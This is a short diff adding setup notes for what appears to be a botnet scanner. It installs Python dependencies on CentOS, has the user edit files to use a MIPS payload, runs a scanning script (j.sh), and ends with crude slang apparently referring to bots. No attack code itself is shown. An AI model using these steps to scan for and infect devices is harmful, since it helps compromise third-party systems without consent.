@@ -1,0 +1,13 @@
+Step 1: Installing the Dependancies
+sudo yum install -y https://centos7.iuscommunity.org/ius-release.rpm
+sudo yum update -y
+sudo yum install -y python36u python36u-libs python36u-devel python36u-pip
+pip3.6 install requests
+
+Step 2: Editing the Files
+*Use Mips Payload
+
+Step 3: Scanning
+sh j.sh
+
+Step 4: BIG MOTHERFUCKING BOATS
